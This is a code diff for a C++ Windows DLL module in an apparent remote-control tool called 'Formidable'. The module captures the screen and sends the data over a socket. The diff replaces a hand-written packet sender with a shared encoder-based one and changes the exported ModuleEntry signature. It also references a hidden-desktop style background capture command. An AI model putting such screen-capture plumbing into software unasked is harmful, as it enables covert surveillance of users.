@@ -17,6 +17,7 @@
 #include <dxgi1_2.h>
 #include <atlbase.h>
 #include "../../Common/Config.h"
+#include "../../Common/NetworkHelper.h"
 
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "gdi32.lib")
@@ -24,6 +25,9 @@
 #pragma comment(lib, "d3d11.lib")
 #pragma comment(lib, "dxgi.lib")
 
+namespace Formidable {
+    ProtocolEncoder* g_pProtocolEncoder = nullptr;
+}
 using namespace Formidable;
 using namespace Gdiplus;
 
@@ -143,32 +147,8 @@ int g_captureMethod = 0; // 0=GDI, 1=DXGI
 DXGICapture* g_dxgiCapture = nullptr;
 
 // 辅助函数：发送数据
-bool SendResponse(SOCKET s, uint32_t cmd, uint32_t arg1, uint32_t arg2, const void* data, int len) {
-    PkgHeader header;
-    memcpy(header.flag, "FRMD26?", 7);
-    header.originLen = sizeof(CommandPkg) - 1 + len;
-    header.totalLen = sizeof(PkgHeader) + header.originLen;
-    
-    std::vector<char> buffer(header.totalLen);
-    memcpy(buffer.data(), &header, sizeof(PkgHeader));
-    
-    CommandPkg* pkg = (CommandPkg*)(buffer.data() + sizeof(PkgHeader));
-    pkg->cmd = cmd;
-    pkg->arg1 = arg1;
-    pkg->arg2 = arg2;
-    if (len > 0 && data) {
-        memcpy(pkg->data, data, len);
-    }
-    
-    const char* pData = buffer.data();
-    int remaining = (int)buffer.size();
-    while (remaining > 0) {
-        int sent = send(s, pData, remaining, 0);
-        if (sent == SOCKET_ERROR || sent == 0) return false;
-        pData += sent;
-        remaining -= sent;
-    }
-    return true;
+void SendResponse(SOCKET s, uint32_t cmd, uint32_t arg1, uint32_t arg2, const void* data, int len) {
+    SendPkg(s, cmd, data, len, arg1, arg2, g_pProtocolEncoder);
 }
 
 // 屏幕信息结构
@@ -332,8 +312,9 @@ void BackgroundCaptureThread(SOCKET s) {
 }
 
 // 导出函数
-extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg) {
+extern "C" __declspec(dllexport) void WINAPI ModuleEntry(SOCKET s, CommandPkg* pkg, ProtocolEncoder* encoder) {
     g_socket = s;
+    g_pProtocolEncoder = encoder;
 
     switch (pkg->cmd) {
         case CMD_BACKGROUND_CREATE: {
